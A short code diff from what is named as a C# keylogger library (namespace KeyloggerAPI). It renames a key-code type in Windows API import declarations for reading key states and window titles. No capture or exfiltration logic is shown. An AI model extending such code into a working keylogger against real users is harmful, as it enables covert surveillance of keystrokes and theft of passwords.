@@ -26,10 +26,10 @@ namespace KeyloggerAPI
 		internal static extern IntPtr GetModuleHandle(string lpModuleName);
 
 		[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
-		internal static extern short GetKeyState(KeyValue virtualKeyCode);
+		internal static extern short GetKeyState(KeyCode virtualKeyCode);
 
 		[DllImport("User32.dll")]
-		internal static extern short GetAsyncKeyState(KeyValue vKey);
+		internal static extern short GetAsyncKeyState(KeyCode vKey);
 
 		[DllImport("User32.dll")]
 		internal static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);
